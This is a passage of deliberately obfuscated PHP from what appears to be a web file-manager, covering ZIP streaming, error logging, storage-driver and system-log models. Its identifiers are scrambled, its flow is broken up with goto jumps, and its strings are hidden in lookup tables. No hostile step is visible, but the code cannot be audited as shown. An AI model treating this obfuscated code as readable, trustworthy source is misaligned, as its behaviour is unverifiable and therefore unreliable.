array($eÙèÃ≥Ω÷¯[1990], static::ZIP_VERSION_64), array($eÙèÃ≥Ω÷¯[1989], 0), array($eÙèÃ≥Ω÷¯[1989], 0), array($eÙèÃ≥Ω÷¯[1991], $Câ∏÷∑ñ™Ë), array($eÙèÃ≥Ω÷¯[1991], $Câ∏÷∑ñ™Ë), array($eÙèÃ≥Ω÷¯[1991], $bﬁ◊å‹–úÎ), array($eÙèÃ≥Ω÷¯[1991], $aëÉ€µ¬Ø„)); $e¡Ãß€®Ó° = $this->packFields($DîÈó˜•∫«); goto C¶ÿƒöΩ»Ü; cá…È‚Ω“†: } protected function addCdr64Locator() { goto eÖì±˘Œßè; EäêØåÖﬁ•: $this->send($a®…µ‡£∞á); goto Eπù≈ƒ“èÏ; eÖì±˘Œßè: $bËËö€Ã„µ =& $_SERVER[—Ω]; $aùñÉı™÷í = count($this->files); $bé´°¬ÖÑ© = $this->cdr_ofs; goto F∫øï„ñº•; F∫øï„ñº•: $aÌœ•úÚñ¬ = $this->ofs; $Cÿì≤Ú›’ = array(array($bËËö€Ã„µ[1989], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($bËËö€Ã„µ[1989], 0), array($bËËö€Ã„µ[1991], $aÌœ•úÚñ¬ + $bé´°¬ÖÑ©), array($bËËö€Ã„µ[1989], 1)); $a®…µ‡£∞á = $this->packFields($Cÿì≤Ú›’); goto EäêØåÖﬁ•; Eπù≈ƒ“èÏ: } protected function addCdrEof() { goto bÜ†ïô´€ﬂ; bÜ†ïô´€ﬂ: $d°ÓùüÔó˜ =& $_SERVER[—Ω]; $dÁ≠ﬂôﬂı = count($this->files); $CÔô¯ú¬–Î = $this->cdr_ofs; goto d¬≈Àªü¿ó; d¬≈Àªü¿ó: $BàÆ«Í≥óô = $this->ofs; $cä·ó∞˘ÔÜ = $d°ÓùüÔó˜[33]; $C¡´¡éßÜÍ = array(array($d°ÓùüÔó˜[1989], static::CDR_EOF_SIGNATURE), array($d°ÓùüÔó˜[1990], 0), array($d°ÓùüÔó˜[1990], 0), array($d°ÓùüÔó˜[1990], $dÁ≠ﬂôﬂı), array($d°ÓùüÔó˜[1990], $dÁ≠ﬂôﬂı), array($d°ÓùüÔó˜[1989], 4294967295), array($d°ÓùüÔó˜[1989], 4294967295), array($d°ÓùüÔó˜[1990], strlen($cä·ó∞˘ÔÜ))); goto Bº £ÕÆ—¯; Bº £ÕÆ—¯: $Dñ∞ÊËÈáî = $this->packFields($C¡´¡éßÜÍ) . $cä·ó∞˘ÔÜ; $this->send($Dñ∞ÊËÈáî); goto Cµ⁄ﬂ·˘Ëˆ; Cµ⁄ﬂ·˘Ëˆ: } protected function addCdr() { foreach ($this->files as $fΩ‘êë¿≤Ü) { $this->addCdrFile($fΩ‘êë¿≤Ü); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $B•Œœ¿àØ∫ =& $_SERVER[—Ω]; $Dâ•Óû¢Ïí = $B•Œœ¿àØ∫[199]; if ($this->outputName) { $eÇ∞óÃƒ±œ = trim(str_replace(array($B•Œœ¿àØ∫[113], $B•Œœ¿àØ∫[55], $B•Œœ¿àØ∫[95], $B•Œœ¿àØ∫[67], $B•Œœ¿àØ∫[214], $B•Œœ¿àØ∫[996]), $B•Œœ¿àØ∫[33], $this->outputName)); $cºﬁÙ–‘©» = rawurlencode($eÇ∞óÃƒ±œ); $Dâ•Óû¢Ïí .= "\73\40\146\x69\x6c\145\x6e\141\155\x65\52\x3d\165\x74\x66\55\x38\x27\x27{$cºﬁÙ–‘©»}"; } $Fç◊ÍßÙÑÏ = array($B•Œœ¿àØ∫[196] => $B•Œœ¿àØ∫[1992], $B•Œœ¿àØ∫[1993] => $Dâ•Óû¢Ïí, $B•Œœ¿àØ∫[1994] => $B•Œœ¿àØ∫[1995], $B•Œœ¿àØ∫[1996] => $B•Œœ¿àØ∫[1997], $B•Œœ¿àØ∫[1998] => $B•Œœ¿àØ∫[1999]); foreach ($Fç◊ÍßÙÑÏ as $c±≤†ÀÜ∏Ω => $dõÈÖåñÀµ) { header($c±≤†ÀÜ∏Ω . $B•Œœ¿àØ∫[886] . $dõÈÖåñÀµ); } } protected function send($CÖóµ⁄ú–Î) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CÖóµ⁄ú–Î); } protected final function dosTime($cáàê¿≥àÕ) { $a·÷≥®∏ÁÏ =& $_SERVER[—Ω]; $cÕ∏¨öã˘Ü = getdate($cáàê¿≥àÕ); if ($cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[1702]] < 1980) { $cÕ∏¨öã˘Ü = array($a·÷≥®∏ÁÏ[1702] => 1980, $a·÷≥®∏ÁÏ[2000] => 1, $a·÷≥®∏ÁÏ[2001] => 1, $a·÷≥®∏ÁÏ[2002] => 0, $a·÷≥®∏ÁÏ[2003] => 0, $a·÷≥®∏ÁÏ[2004] => 0); } $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[1702]] -= 1980; return $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[1702]] << 25 | $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[2000]] << 21 | $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[2001]] << 16 | $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[2002]] << 11 | $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[2003]] << 5 | $cÕ∏¨öã˘Ü[$a·÷≥®∏ÁÏ[2004]] >> 1; } protected function packFields($E≥œ¿Ÿ„Ω∏) { $DÑª®ÉÁœ… =& $_SERVER[—Ω]; $fÓûª§Ÿ≈Ñ = $DÑª®ÉÁœ…[33]; $fú«¥ÕÀ≥˘ = array(); foreach ($E≥œ¿Ÿ„Ω∏ as $BÎ„ÎñéÜœ) { $fÓûª§Ÿ≈Ñ .= $BÎ„ÎñéÜœ[0]; $fú«¥ÕÀ≥˘[] = $BÎ„ÎñéÜœ[1]; } array_unshift($fú«¥ÕÀ≥˘, $fÓûª§Ÿ≈Ñ); return call_user_func_array($DÑª®ÉÁœ…[2005], $fú«¥ÕÀ≥˘); } protected function filterFilename($C¢„»ÚÖÀË) { $f»ÒËÇÑ€ =& $_SERVER[—Ω]; return str_replace(array($f»ÒËÇÑ€[95], $f»ÒËÇÑ€[4], $f»ÒËÇÑ€[173], $f»ÒËÇÑ€[69], $f»ÒËÇÑ€[113], $f»ÒËÇÑ€[931], $f»ÒËÇÑ€[934], $f»ÒËÇÑ€[268]), $f»ÒËÇÑ€[70], $C¢„»ÚÖÀË); } } class ZipStream { } goto aÎÔê¶≠±ø; bê¥ÿÇ√øò: function beforeShutdownError($BÖÓÉ∂µ⁄Ñ = false, $açÏ¥≤éç = '', $C„ºæ¥œ≥º = '', $EÃ∆Ÿòıœä = 0) { $eÑ¬∞Û†áä =& $_SERVER[ªƒÓ™éå]; switch ($BÖÓÉ∂µ⁄Ñ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $Aﬁ‚¯â÷∞¢ = $eÑ¬∞Û†áä[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $Aﬁ‚¯â÷∞¢ = $eÑ¬∞Û†áä[40]; break; case E_STRICT: $Aﬁ‚¯â÷∞¢ = $eÑ¬∞Û†áä[41]; break; case E_NOTICE: case E_USER_NOTICE: $Aﬁ‚¯â÷∞¢ = $eÑ¬∞Û†áä[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $Aﬁ‚¯â÷∞¢ = $eÑ¬∞Û†áä[43]; break; default: break; } if (!$Aﬁ‚¯â÷∞¢ || $Aﬁ‚¯â÷∞¢ == $eÑ¬∞Û†áä[42] || $Aﬁ‚¯â÷∞¢ == $eÑ¬∞Û†áä[43]) { return; } $C„ºæ¥œ≥º = $eÑ¬∞Û†áä[4] . str_replace($_SERVER[$eÑ¬∞Û†áä[37]], $eÑ¬∞Û†áä[20], $C„ºæ¥œ≥º); $B›ä‰üÜñ— = $Aﬁ‚¯â÷∞¢ . $eÑ¬∞Û†áä[44] . $açÏ¥≤éç . $eÑ¬∞Û†áä[44] . $C„ºæ¥œ≥º . $eÑ¬∞Û†áä[44] . $EÃ∆Ÿòıœä; write_log($B›ä‰üÜñ— . $eÑ¬∞Û†áä[18] . get_caller_msg(1), $eÑ¬∞Û†áä[19]); } $_SERVER[$_SERVER[ªƒÓ™éå][45]] = $_SERVER[$_SERVER[ªƒÓ™éå][37]] . $_SERVER[ªƒÓ™éå][46]; $c¥≈Ï¿ã…ı = strrev(base64_decode($_SERVER[ªƒÓ™éå][47])); goto Cª∫Ô»â∑±; E‘…Ò›∞ñ›: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\163\x74\157\162\141\x67\145\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\x73\x69\x7a\x65\x4d\141\170", "\x73\x79\163\164\x65\x6d", "\x64\145\x66\x61\165\154\x74", "\x64\162\151\x76\x65\x72", "\143\157\x6e\146\151\x67"); public function listData($f–§Î¯˜‰∑ = false, $c√øÖß„§œ = "\155\x6f\144\x69\x66\x79\124\151\155\145", $A–ô——¢Ÿ  = false) { goto FÁ‘ƒœ≈““; FÁ‘ƒœ≈““: $DÚÿ˘˘Ô õ =& $_SERVER[—Ω]; $f†•†ëﬁÿç = parent::listData($f–§Î¯˜‰∑, $c√øÖß„§œ, $A–ô——¢Ÿ ); if ($f–§Î¯˜‰∑) { return $f†•†ëﬁÿç; } goto F¶—à”æÖº; d‰ÖıÜ≤Á¬: return $f†•†ëﬁÿç; goto a´Ó‚ÒòÍ‰; F¶—à”æÖº: foreach ($f†•†ëﬁÿç as $b⁄Á®øÉÂÇ => $B≤ÊÑÏøøı) { unset($f†•†ëﬁÿç[$b⁄Á®øÉÂÇ][$DÚÿ˘˘Ô õ[6]]); $f†•†ëﬁÿç[$b⁄Á®øÉÂÇ][$DÚÿ˘˘Ô õ[2066]] = 0; } $Fœ™π‰‘ˆﬁ = array_to_keyvalue($f†•†ëﬁÿç, $DÚÿ˘˘Ô õ[33], $DÚÿ˘˘Ô õ[364]); $this->_listAppendSize($f†•†ëﬁÿç, $Fœ™π‰‘ˆﬁ); goto d‰ÖıÜ≤Á¬; a´Ó‚ÒòÍ‰: } public function _listAppendSize(&$E∞ºõ†ñû∫, $Fõ¨⁄„¶ŒÙ) { $FΩ£‡º¡á“ =& $_SERVER[—Ω]; $Cï¿â’é¶ª = $FΩ£‡º¡á“[2331] . implode($FΩ£‡º¡á“[47], $Fõ¨⁄„¶ŒÙ) . $FΩ£‡º¡á“[2332]; $fë¥¡—©É∑ = Model($FΩ£‡º¡á“[729])->query($Cï¿â’é¶ª); $fë¥¡—©É∑ = array_to_keyvalue($fë¥¡—©É∑, $FΩ£‡º¡á“[364], $FΩ£‡º¡á“[77]); foreach ($E∞ºõ†ñû∫ as $BÖáô√ùÓ± => $fºΩô∫é◊·) { $E∞ºõ†ñû∫[$BÖáô√ùÓ±][$FΩ£‡º¡á“[2066]] = isset($fë¥¡—©É∑[$fºΩô∫é◊·[$FΩ£‡º¡á“[364]]]) ? $fë¥¡—©É∑[$fºΩô∫é◊·[$FΩ£‡º¡á“[364]]] : 0; } } public function getConfig($bÇÕΩöäé®) { $A£ø‹ØïÂÑ = parent::listData($bÇÕΩöäé®); return json_decode($A£ø‹ØïÂÑ[$_SERVER[—Ω][6]], !0); } public function update($AΩó•õ⁄ÜÆ, $eÚ§Æ¬áû) { goto EÁàŒ©“ˆŸ; a÷ëª·ùÃÌ: if (isset($A¨∏£‘ø¿∆[$b∑‚ÖªÓ¿√]) && $A¨∏£‘ø¿∆[$b∑‚ÖªÓ¿√][$dπ¿ÊüùË[364]] != $AΩó•õ⁄ÜÆ) { return !1; } if (isset($eÚ§Æ¬áû[$dπ¿ÊüùË[2333]]) && $eÚ§Æ¬áû[$dπ¿ÊüùË[2333]] == $dπ¿ÊüùË[83]) { $this->checkConfig($eÚ§Æ¬áû); } unset($eÚ§Æ¬áû[$dπ¿ÊüùË[2333]]); goto b¢îÀ€Óä©; b¢îÀ€Óä©: $aí¿¿ä∑Î‰ = parent::update($AΩó•õ⁄ÜÆ, $eÚ§Æ¬áû); if ($aí¿¿ä∑Î‰ && $eÚ§Æ¬áû[$dπ¿ÊüùË[34]]) { foreach ($A¨∏£‘ø¿∆ as $bÌÊ¶ã¿Í–) { if ($bÌÊ¶ã¿Í–[$dπ¿ÊüùË[34]] && $bÌÊ¶ã¿Í–[$dπ¿ÊüùË[364]] != $AΩó•õ⁄ÜÆ) { parent::update($bÌÊ¶ã¿Í–[$dπ¿ÊüùË[364]], array($dπ¿ÊüùË[34] => 0)); } } } return $aí¿¿ä∑Î‰; goto féáÖé“úø; EÁàŒ©“ˆŸ: $dπ¿ÊüùË =& $_SERVER[—Ω]; $b∑‚ÖªÓ¿√ = $eÚ§Æ¬áû[$dπ¿ÊüùË[28]]; $A¨∏£‘ø¿∆ = array_to_keyvalue(parent::listData(), $dπ¿ÊüùË[28]); goto a÷ëª·ùÃÌ; féáÖé“úø: } public function add($AÖßÌÓÚæú) { goto DÑå≈¯ü£ä; C∏Î§åº»ç: return $díÏèº√û; goto Fê“Öç«û«; D¡ÑæÃÖ´ê: $this->checkConfig($AÖßÌÓÚæú); $díÏèº√û = parent::insert($AÖßÌÓÚæú); if ($díÏèº√û && $AÖßÌÓÚæú[$b™£îö©âˆ[34]]) { foreach ($E¬ÉÇ‹ÆåÑ as $f‘’›ø©≥é) { if ($f‘’›ø©≥é[$b™£îö©âˆ[34]]) { parent::update($f‘’›ø©≥é[$b™£îö©âˆ[364]], array($b™£îö©âˆ[34] => 0)); } } } goto C∏Î§åº»ç; DÑå≈¯ü£ä: $b™£îö©âˆ =& $_SERVER[—Ω]; $E¬ÉÇ‹ÆåÑ = array_to_keyvalue(parent::listData(), $b™£îö©âˆ[28]); if (isset($E¬ÉÇ‹ÆåÑ[$AÖßÌÓÚæú[$b™£îö©âˆ[28]]])) { return !1; } goto D¡ÑæÃÖ´ê; Fê“Öç«û«: } public function checkConfig(&$c«£°‘ﬂ±Õ) { goto f©ô¯†‚äπ; Bßùû–Íä≤: $dØï‹Ãı´œ = $BƒŸ≠Œ˜£à->getPath($FÏòöÁÎäâ . $d◊çèÂôçë[1962]); if (!$BƒŸ≠Œ˜£à->mkfile($dØï‹Ãı´œ)) { show_json(LNG($d◊çèÂôçë[2334]), !1); } $e¶…—ÑπÚÖ[$d◊çèÂôçë[1028]] = $FÏòöÁÎäâ; goto B›ﬂì≤è«‰; aÇö¶≠ƒØﬂ: foreach ($e¶…—ÑπÚÖ as $E±°·ˆã¬ö => $b¢êŸ∏ä¡ó) { $e¶…—ÑπÚÖ[$E±°·ˆã¬ö] = trim($b¢êŸ∏ä¡ó); } $FÏòöÁÎäâ = rtrim($e¶…—ÑπÚÖ[$d◊çèÂôçë[1028]], $d◊çèÂôçë[8]) . $d◊çèÂôçë[8]; $aáÑ›õ∞∞Æ = $this->driverType($C∑ÏÓ˜Ïî˜); goto EÙ“ª…Ü·™; B›ﬂì≤è«‰: $c«£°‘ﬂ±Õ[$d◊çèÂôçë[6]] = json_encode($e¶…—ÑπÚÖ); $c«£°‘ﬂ±Õ[$d◊çèÂôçë[90]] = $aáÑ›õ∞∞Æ; return !0; goto fÑç” Âîà; EÙ“ª…Ü·™: $c∞±œ˜©Ò” = $d◊çèÂôçë[71] . $aáÑ›õ∞∞Æ; $BƒŸ≠Œ˜£à = new $c∞±œ˜©Ò”($e¶…—ÑπÚÖ); if (in_array($C∑ÏÓ˜Ïî˜, $BƒŸ≠Œ˜£à->objectDriver)) { if (!$BƒŸ≠Œ˜£à->isBucketCors() && !$BƒŸ≠Œ˜£à->setBucketCors()) { $a¡Ç‡©Ó± = LNG($d◊çèÂôçë[2334]); $a¡Ç‡©Ó± .= $d◊çèÂôçë[2335] . LNG($d◊çèÂôçë[2336]); show_json($a¡Ç‡©Ó±, !1); } } goto Bßùû–Íä≤; f©ô¯†‚äπ: $d◊çèÂôçë =& $_SERVER[—Ω]; $C∑ÏÓ˜Ïî˜ = strtolower($c«£°‘ﬂ±Õ[$d◊çèÂôçë[90]]); $e¶…—ÑπÚÖ = json_decode_force($c«£°‘ﬂ±Õ[$d◊çèÂôçë[6]]); goto aÇö¶≠ƒØﬂ; fÑç” Âîà: } private function driverType($e©⁄Ñä¬†î) { $Dãí≥Ö¨¶î =& $_SERVER[—Ω]; $Cèº§êØ¢ä = array($Dãí≥Ö¨¶î[103] => $Dãí≥Ö¨¶î[2337], $Dãí≥Ö¨¶î[58] => $Dãí≥Ö¨¶î[2338], $Dãí≥Ö¨¶î[64] => $Dãí≥Ö¨¶î[2339]); if (isset($Cèº§êØ¢ä[$e©⁄Ñä¬†î])) { return $Cèº§êØ¢ä[$e©⁄Ñä¬†î]; } return strtoupper($e©⁄Ñä¬†î); } public function driverListSystem() { $fÚ‰ëèΩ’ =& $_SERVER[—Ω]; $C√éôÆˆÆ– = parent::listData(); $FΩﬁ›æúìú = array(); foreach ($C√éôÆˆÆ– as $FâÁ†‹≥◊Í) { unset($FâÁ†‹≥◊Í[$fÚ‰ëèΩ’[184]], $FâÁ†‹≥◊Í[$fÚ‰ëèΩ’[107]]); $FâÁ†‹≥◊Í[$fÚ‰ëèΩ’[6]] = json_decode_force($FâÁ†‹≥◊Í[$fÚ‰ëèΩ’[6]]); $FΩﬁ›æúìú[] = $FâÁ†‹≥◊Í; } return $FΩﬁ›æúìú; } public function defaultDriver() { $dΩ´“ÜÎ∑› =& $_SERVER[—Ω]; $FíÎı¯ªüﬁ = parent::listData(); $d¶óâÿ¥º‚ = array_filter_by_field($FíÎı¯ªüﬁ, $dΩ´“ÜÎ∑›[34], 1); $d¶óâÿ¥º‚ = $d¶óâÿ¥º‚[0]; if ($d¶óâÿ¥º‚) { $d¶óâÿ¥º‚[$dΩ´“ÜÎ∑›[6]] = json_decode($d¶óâÿ¥º‚[$dΩ´“ÜÎ∑›[6]], !0); } return $d¶óâÿ¥º‚; } public function driverInfo($dÍÙîÔ÷¥•) { $eÏœàå„Ê‘ =& $_SERVER[—Ω]; $F≈≤Ω¯ªΩó = array_to_keyvalue(parent::listData(), $eÏœàå„Ê‘[364]); if (!isset($F≈≤Ω¯ªΩó[$dÍÙîÔ÷¥•])) { return !1; } $DÛ’Ÿ–¶≠à = $F≈≤Ω¯ªΩó[$dÍÙîÔ÷¥•]; $DÛ’Ÿ–¶≠à[$eÏœàå„Ê‘[6]] = json_decode_force($DÛ’Ÿ–¶≠à[$eÏœàå„Ê‘[6]]); return $DÛ’Ÿ–¶≠à; } public function removeWithFile($aõ‹‡ÿ¥ØÀ) { goto fÊ†©Ö¯◊Ω; Føäæ»·ÓÛ: $cË≈• Î‚º->task[$f††ÊõÁöó[708]] = (double) $b∆äØüèπÇ; $D¥“¶¨◊¥´ = KodIO::defaultDriver(); $a¯ä∆ãƒ¨¥ = $D¥“¶¨◊¥´[$f††ÊõÁöó[364]]; goto FÏÓµî‚‡È; fÊ†©Ö¯◊Ω: $f††ÊõÁöó =& $_SERVER[—Ω]; $e˘ëâ⁄ó±ö = array($f††ÊõÁöó[753] => $aõ‹‡ÿ¥ØÀ); $EÂáÙ¨ï≠¶ = Model($f††ÊõÁöó[418])->where($e˘ëâ⁄ó±ö)->count(); goto E…¢„åƒ‚Î; DõéÚ‘¿”Á: $fßü±Ç¥¯ã = Model($f††ÊõÁöó[164])->where($e˘ëâ⁄ó±ö)->field($f††ÊõÁöó[2343])->select(); foreach ($fßü±Ç¥¯ã as $a«°Ì‹≤≥≈) { goto FÑÆƒÓúÑã; C—ÊÒÇ‰∫å: $B—≠®√À±ﬁ = array($f††ÊõÁöó[753] => $a¯ä∆ãƒ¨¥, $f††ÊõÁöó[75] => $D˘Î¶ﬁ≥ãó); Model($f††ÊõÁöó[164])->where($e˘ëâ⁄ó±ö)->save($B—≠®√À±ﬁ); goto f“•∆≠‹ù‡; f—˘Ã°¨µÑ: if (IO::exist($D˘Î¶ﬁ≥ãó)) { $cË≈• Î‚º->updateFileEnd($a«°Ì‹≤≥≈[$f††ÊõÁöó[28]], $a«°Ì‹≤≥≈[$f††ÊõÁöó[77]]); continue; } if (!IO::move($cñå› ƒ¨≈, get_path_father($D˘Î¶ﬁ≥ãó))) { $EΩúè∫áÇã = !1; break; } $e˘ëâ⁄ó±ö = array($f††ÊõÁöó[415] => $a«°Ì‹≤≥≈[$f††ÊõÁöó[415]]); goto C—ÊÒÇ‰∫å; FÑÆƒÓúÑã: $cñå› ƒ¨≈ = $a«°Ì‹≤≥≈[$f††ÊõÁöó[75]]; $D˘Î¶ﬁ≥ãó = $dµÀ¶≥≤ÿÖ . str_replace("\173\x69\x6f\72{$aõ‹‡ÿ¥ØÀ}\x7d\x2f", $f††ÊõÁöó[33], $cñå› ƒ¨≈); if (!IO::exist($cñå› ƒ¨≈)) { $f–éÎ ¿èé[] = $a«°Ì‹≤≥≈[$f††ÊõÁöó[415]]; $cË≈• Î‚º->updateFileEnd($a«°Ì‹≤≥≈[$f††ÊõÁöó[28]], $a«°Ì‹≤≥≈[$f††ÊõÁöó[77]]); continue; } goto f—˘Ã°¨µÑ; f“•∆≠‹ù‡: } $this->removeByFileID($f–éÎ ¿èé); goto f§î‡ò√ßç; FÏÓµî‚‡È: $dµÀ¶≥≤ÿÖ = "\173\x69\x6f\x3a{$a¯ä∆ãƒ¨¥}\x7d\57"; $EΩúè∫áÇã = !0; $f–éÎ ¿èé = array(); goto DõéÚ‘¿”Á; f§î‡ò√ßç: if (!$EΩúè∫áÇã) { $cË≈• Î‚º->stop($a∞∫¶Ñ¨—Ω); return !1; } $cË≈• Î‚º->end(); return parent::remove($aõ‹‡ÿ¥ØÀ); goto BßÚΩ†»Ã‰; E…¢„åƒ‚Î: $b∆äØüèπÇ = Model($f††ÊõÁöó[418])->where($e˘ëâ⁄ó±ö)->sum($f††ÊõÁöó[77]); $a∞∫¶Ñ¨—Ω = $f††ÊõÁöó[2340] . $aõ‹‡ÿ¥ØÀ; $cË≈• Î‚º = new TaskFileTransfer($a∞∫¶Ñ¨—Ω, $f††ÊõÁöó[2341], $EÂáÙ¨ï≠¶, LNG($f††ÊõÁöó[2342]) . "\x28{$aõ‹‡ÿ¥ØÀ}\x29"); goto Føäæ»·ÓÛ; BßÚΩ†»Ã‰: } public function progress($e≥Æûî˘á∂) { return Task::get($_SERVER[—Ω][2340] . $e≥Æûî˘á∂); } private function removeByFileID($fè‘™¥∞ª¡ = array()) { goto f∑÷—ø¯üÌ; f∑÷—ø¯üÌ: $d©ÿÑ©ìÎﬂ =& $_SERVER[—Ω]; if (empty($fè‘™¥∞ª¡)) { return; } $a®ŸœüÃ‚” = array($d©ÿÑ©ìÎﬂ[415] => array($d©ÿÑ©ìÎﬂ[7], $fè‘™¥∞ª¡)); goto båÒÔÓÖ‹ﬂ; AÕÈú”ëππ: foreach ($c≈®¿û‡œÖ as $E°ä°æÚ∆–) { Model($d©ÿÑ©ìÎﬂ[379])->removeNow($E°ä°æÚ∆–, !1); } goto F–ìíô™‚¢; båÒÔÓÖ‹ﬂ: $c≈®¿û‡œÖ = Model($d©ÿÑ©ìÎﬂ[1114])->where($a®ŸœüÃ‚”)->field($d©ÿÑ©ìÎﬂ[366])->select(); if (!$c≈®¿û‡œÖ) { return; } $c≈®¿û‡œÖ = array_to_keyvalue($c≈®¿û‡œÖ, $d©ÿÑ©ìÎﬂ[33], $d©ÿÑ©ìÎﬂ[366]); goto AÕÈú”ëππ; F–ìíô™‚¢: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x4c\x69\x67\150\x74\101\160\x70"; public $modelType = "\123\x79\163\x74\x65\x6d\x4f\160\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\x67\162\x6f\165\160", "\144\145\163\143", "\x63\x6f\x6e\x74\145\x6e\164"); public function listData($DìﬁøΩºã° = false, $fÔ≠ì≈ËñÑ = "\x6d\x6f\x64\151\146\x79\124\151\x6d\145", $b≈Ûœ™É› = true) { return parent::listData($DìﬁøΩºã°, $fÔ≠ì≈ËñÑ, $b≈Ûœ™É›); } public function remove($DéÓ◊˘ÍËŒ) { $FŸ∏≤èõ¯ﬂ = $this->findByName($DéÓ◊˘ÍËŒ); if (!$FŸ∏≤èõ¯ﬂ) { return !1; } return parent::remove($FŸ∏≤èõ¯ﬂ[$_SERVER[—Ω][364]]); } public function add($b¯≈–»««ä) { if ($this->findByName($b¯≈–»««ä[$_SERVER[—Ω][28]])) { return !1; } return parent::insert($b¯≈–»««ä); } public function update($D…ã»›¶ê„, $cûè¢÷ƒãˆ) { $a®åæÜ„Ç» =& $_SERVER[—Ω]; $A¨âí¿¢î∑ = $this->findByName($D…ã»›¶ê„); $a‹‹ïœúÁ” = $this->findByName($cûè¢÷ƒãˆ[$a®åæÜ„Ç»[28]]); if (!$A¨âí¿¢î∑ || $a‹‹ïœúÁ” && $a‹‹ïœúÁ”[$a®åæÜ„Ç»[364]] != $A¨âí¿¢î∑[$a®åæÜ„Ç»[364]]) { return !1; } return parent::update($A¨âí¿¢î∑[$a®åæÜ„Ç»[364]], $cûè¢÷ƒãˆ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\162\164", "\146\x75\x6e\x63\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $eÊàΩéÃ≠‹ =& $_SERVER[—Ω]; return array($eÊàΩéÃ≠‹[2344] => LNG($eÊàΩéÃ≠‹[2345]), $eÊàΩéÃ≠‹[2346] => LNG($eÊàΩéÃ≠‹[2347]), $eÊàΩéÃ≠‹[2020] => LNG($eÊàΩéÃ≠‹[2348]), $eÊàΩéÃ≠‹[2349] => LNG($eÊàΩéÃ≠‹[2350]), $eÊàΩéÃ≠‹[2351] => LNG($eÊàΩéÃ≠‹[2352]), $eÊàΩéÃ≠‹[2353] => LNG($eÊàΩéÃ≠‹[2354]), $eÊàΩéÃ≠‹[2355] => LNG($eÊàΩéÃ≠‹[2356]), $eÊàΩéÃ≠‹[2357] => LNG($eÊàΩéÃ≠‹[2358]), $eÊàΩéÃ≠‹[2051] => LNG($eÊàΩéÃ≠‹[2359]), $eÊàΩéÃ≠‹[2052] => LNG($eÊàΩéÃ≠‹[2360]), $eÊàΩéÃ≠‹[2361] => LNG($eÊàΩéÃ≠‹[2362]), $eÊàΩéÃ≠‹[2363] => LNG($eÊàΩéÃ≠‹[2364]), $eÊàΩéÃ≠‹[2365] => LNG($eÊàΩéÃ≠‹[2366]), $eÊàΩéÃ≠‹[2367] => LNG($eÊàΩéÃ≠‹[2368]), $eÊàΩéÃ≠‹[2049] => LNG($eÊàΩéÃ≠‹[2369]), $eÊàΩéÃ≠‹[2055] => LNG($eÊàΩéÃ≠‹[2370]), $eÊàΩéÃ≠‹[2371] => LNG($eÊàΩéÃ≠‹[2372]), $eÊàΩéÃ≠‹[2373] => LNG($eÊàΩéÃ≠‹[2374]), $eÊàΩéÃ≠‹[2375] => LNG($eÊàΩéÃ≠‹[2376]), $eÊàΩéÃ≠‹[2377] => LNG($eÊàΩéÃ≠‹[2378]), $eÊàΩéÃ≠‹[2058] => LNG($eÊàΩéÃ≠‹[2379]), $eÊàΩéÃ≠‹[2059] => LNG($eÊàΩéÃ≠‹[2380]), $eÊàΩéÃ≠‹[2381] => LNG($eÊàΩéÃ≠‹[2382]), $eÊàΩéÃ≠‹[2383] => LNG($eÊàΩéÃ≠‹[2384]), $eÊàΩéÃ≠‹[2385] => LNG($eÊàΩéÃ≠‹[2386]), $eÊàΩéÃ≠‹[2387] => LNG($eÊàΩéÃ≠‹[2388]), $eÊàΩéÃ≠‹[2389] => LNG($eÊàΩéÃ≠‹[2390]), $eÊàΩéÃ≠‹[2053] => LNG($eÊàΩéÃ≠‹[2391]), $eÊàΩéÃ≠‹[2392] => LNG($eÊàΩéÃ≠‹[2393]), $eÊàΩéÃ≠‹[2394] => LNG($eÊàΩéÃ≠‹[2395]), $eÊàΩéÃ≠‹[2396] => LNG($eÊàΩéÃ≠‹[2396]), $eÊàΩéÃ≠‹[2397] => LNG($eÊàΩéÃ≠‹[2024]), $eÊàΩéÃ≠‹[2398] => LNG($eÊàΩéÃ≠‹[2399]), $eÊàΩéÃ≠‹[2400] => LNG($eÊàΩéÃ≠‹[2401]), $eÊàΩéÃ≠‹[2402] => LNG($eÊàΩéÃ≠‹[2403]), $eÊàΩéÃ≠‹[2404] => LNG($eÊàΩéÃ≠‹[2405]), $eÊàΩéÃ≠‹[2406] => LNG($eÊàΩéÃ≠‹[2406]), $eÊàΩéÃ≠‹[2407] => LNG($eÊàΩéÃ≠‹[2408]), $eÊàΩéÃ≠‹[2409] => LNG($eÊàΩéÃ≠‹[2410]), $eÊàΩéÃ≠‹[2411] => LNG($eÊàΩéÃ≠‹[2412]), $eÊàΩéÃ≠‹[2413] => LNG($eÊàΩéÃ≠‹[2414]), $eÊàΩéÃ≠‹[2415] => LNG($eÊàΩéÃ≠‹[2416]), $eÊàΩéÃ≠‹[2417] => LNG($eÊàΩéÃ≠‹[2418])); } private function typeFile() { $aëä◊‰Û∞π =& $_SERVER[—Ω]; $B™∫ªÿ»œ’ = array($aëä◊‰Û∞π[2055] => 